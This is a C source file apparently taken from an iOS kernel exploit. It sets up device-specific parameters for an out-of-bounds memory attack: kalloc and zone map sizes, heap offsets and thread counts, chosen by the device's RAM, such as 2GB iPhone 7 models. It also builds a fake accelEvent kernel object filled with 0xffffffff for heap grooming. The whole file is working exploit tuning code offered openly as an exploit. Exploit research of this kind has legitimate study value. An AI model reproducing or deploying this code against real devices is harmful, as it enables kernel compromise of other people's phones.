
#include "exploit.h"

uint8_t* oob_fake_accelEvent = NULL;
uint32_t oob_fake_accelEvent_size = 0;

uint32_t oob_kalloc_map_size = 0, oob_zone_map_size = 0;
uint32_t oob_thread_no = 2;
uint64_t *oob_indexes = NULL;
uint32_t oob_iter = 0;
uint32_t oob_accel_alloc_size = 0x300;
int oob_loop = 5;

uint64_t oob_bar = 0;
void oob_prepare_device_memory()
{

        int name[2] = {CTL_HW, HW_MEMSIZE};
        uint64_t max_mem = 0;
        size_t len = sizeof(uint64_t);

        //hw.memsize
        int err = sysctl(name, 2, &max_mem, &len, NULL, 0);
        if (err < 0) {
                perror("sysctl(hw.memsize)");
                exit(-1);
        }

        // config for 2GB RAM devices like iPhone 7
        if(max_mem <= (uint64_t)2048 MB) {
                //kalloc_map_size = 0x03bd23ff;
                oob_kalloc_map_size = 60 MB;
                //kalloc_map_size = 80 MB;
                //zone_map_size   = 0x2cddc000; //
                oob_zone_map_size = 500 MB;//600 MB ;//720 MB - 120 MB;
                oob_indexes = calloc(3,sizeof(uint64_t));
                oob_bar = 0x1100000;

                oob_iter = 0x1000;
                oob_indexes[0] = 0x1e83bf6;
                oob_thread_no  = 5;
                // All device with 4GB RAM can be put here
        } else if(max_mem <= (uint64_t)4096 MB) {
                oob_accel_alloc_size = 0x600;
                oob_indexes = calloc(3,sizeof(uint64_t));

                oob_indexes[0] = 0x399b7f6;

                //zone_map_size   = 0x53978000; // real size
                //zone_map_size   = 1150 MB; // size with adjustment to avoid zone map exhaust
                oob_zone_map_size   = 1150 MB; // size with adjustment to avoid zone map exhaust

                //kalloc_map_size = 0x6f745ff;
                oob_kalloc_map_size = 120 MB;
                //kalloc_map_size = 160 MB;
                oob_bar = 0x1100000;
                oob_iter = 0x400;//00;
                //loop = 5;

                oob_thread_no = 6; // 6

        } else {
                printf("Cannot exec the exploit on this device \n");
        }
        printf("[+] Memory size 0x%llx \n",max_mem);
        assert(oob_bar != 0);
        if(oob_indexes == NULL) {
                printf("[-] Exploit is not tuned to this device yet \n");
                //exit(0);
        }
        oob_fake_accelEvent_size = (uint32_t)PAGE_SIZE;

        oob_fake_accelEvent = calloc(oob_fake_accelEvent_size,1);
        assert(oob_fake_accelEvent);

        //accel_alloc_size = 0x100 + (0x100 * 3);
        for(int i=0; i <(oob_fake_accelEvent_size/8); i++)
                *(uint64_t *)((uint64_t *) oob_fake_accelEvent + i) = 0xffffffff;

}
